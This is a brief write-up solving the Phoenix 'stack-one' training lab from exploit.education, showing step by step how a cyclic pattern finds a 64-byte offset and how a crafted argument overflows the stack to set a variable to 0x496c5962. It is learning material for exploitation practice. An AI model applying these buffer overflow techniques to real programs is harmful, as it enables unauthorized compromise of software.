# Stack One Solution

[lab](https://exploit.education/phoenix/stack-zero/)  

This is very easy chall. You don't even need to read the source code to exploit this because the program prints some helpful text to help you around. You first play around with the binary a bit. You can also see that SUID bit is enabled for this binary, but we don't require that now. I created a simple payload using `python -c 'from pwn import *; print(cyclic(100))'` and sent that to binary.  

``` sh
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaa
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Getting closer! changeme is currently 0x61616171, we want 0x496c5962
```  

As if we decode this hex value using `python -c print(b"\x61\x61\x61\x71".decode("ascii"))`, we'll get that this is *aaaq*. Now this is printing value as an integer (from the looks of it because this is printed as a single 4 byte hex value). So, we must change the order from "aaaq" to "qaaa" to find the correct offset.Finding offset of this using `python -c 'from pwn import *; print(cyclic_find('qaaa'))'` we get 64 as offset. This means our next payload will look something like this : `64 bytes of useless data + 4 bytes of target data`.  

The program wants `0x496c5962` to be written at its target data. We create our new payload as : `python -c 'print(b"a"*64 + b"\x62\x59\x6c\x49")'` and sent it to program input. Notice that those hex characters are ascii chars, so we shouldn't have any problems with printing those.  

``` sh
user@phoenix-amd64:/opt/phoenix/amd64$ ./stack-one aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaabYlI
Welcome to phoenix/stack-one, brought to you by https://exploit.education
Well done, you have successfully set changeme to the correct value
```

Solved!
